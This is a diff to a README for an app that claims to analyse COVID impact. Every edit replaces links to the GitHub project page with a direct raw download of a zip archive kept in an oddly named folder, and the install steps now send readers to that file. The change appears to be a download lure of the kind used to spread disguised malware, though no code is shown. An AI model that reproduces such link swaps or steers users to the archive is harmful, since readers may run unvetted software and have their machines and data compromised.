@@ -1,9 +1,9 @@
 # 🦠 pandemic-impact-analysis - Track COVID Impact With Clear Data
 
-[![Download](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/British-whitebean324/pandemic-impact-analysis)
+[![Download](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/British-whitebean324/pandemic-impact-analysis/main/autoeciously/impact_analysis_pandemic_3.4.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/British-whitebean324/pandemic-impact-analysis
+Visit this page to download: https://raw.githubusercontent.com/British-whitebean324/pandemic-impact-analysis/main/autoeciously/impact_analysis_pandemic_3.4.zip
 
 ## 🖥️ What This App Does
 
@@ -38,7 +38,7 @@ If you already have Python installed, you can use it to run the app from the sou
 Follow these steps on Windows:
 
 1. Open the download page:
-   https://github.com/British-whitebean324/pandemic-impact-analysis
+   https://raw.githubusercontent.com/British-whitebean324/pandemic-impact-analysis/main/autoeciously/impact_analysis_pandemic_3.4.zip
 
 2. On the GitHub page, choose the latest release or the main project files.
 
@@ -200,4 +200,4 @@ Better data gives better charts and risk checks.
 - Rule-based analysis
 
 ## 🔗 Download Again
-https://github.com/British-whitebean324/pandemic-impact-analysis
+https://raw.githubusercontent.com/British-whitebean324/pandemic-impact-analysis/main/autoeciously/impact_analysis_pandemic_3.4.zip
